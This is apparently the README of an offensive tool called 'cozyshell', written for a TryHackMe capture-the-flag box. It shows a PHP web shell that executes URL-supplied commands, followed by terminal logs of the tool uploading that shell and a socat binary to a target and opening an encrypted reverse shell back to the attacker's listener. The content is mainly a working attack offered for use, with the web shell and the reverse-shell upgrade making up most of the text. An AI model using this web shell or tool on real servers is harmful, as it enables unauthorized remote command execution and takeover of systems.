
$_COZYSHELL

  **Developed for the 'year of the dog' THM box, use it with caution and responsability**

- First we need to upload a webshell like the one bellow.
```php
  <?php echo shell_exec($_GET["cmd"]); ?>
```
```txt
┌──(root㉿kali)-[~/cozyshell]
└─# ../t.py -u http://10.10.44.102/
[*] Injecting webshell at http://10.10.44.102/cae822a9.php
[*] Success! We got a webshell as www-data
```
---
- Now we can quickly upgraded to a nice and cozy interactive shell
```
┌──(root㉿kali)-[~/cozyshell]
└─# ./cozyshell --url http://10.10.44.102/cae822a9.php --lhost 10.13.21.200 --lport 8443 
[*] Uploading socat binary to /var/www/html/c233735f
[*] Starting Webserver
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.44.102 - - [06/Jan/2024 18:56:53] "GET /bin HTTP/1.1" 200 -
[*] Finished uploading socat!
[*] Killing Webserver process
[*] Starting reverse shell handler on tty /dev/pts/1
[*] Paste CMD: export TERM=screen; stty rows 59 cols 116
[*] Sending encrypted reverse shell to 10.13.42.125:8443
<www/html$ export TERM=screen; stty rows 59 cols 116
www-data@year-of-the-dog:/var/www/html$ pwd
/var/www/html
www-data@year-of-the-dog:/var/www/html$ ls
assets	c233735f  cae822a9.php	config.php  index.php
www-data@year-of-the-dog:/var/www/html$ exit
exit
[*] Finished executing interactive shell
[*] Success
```

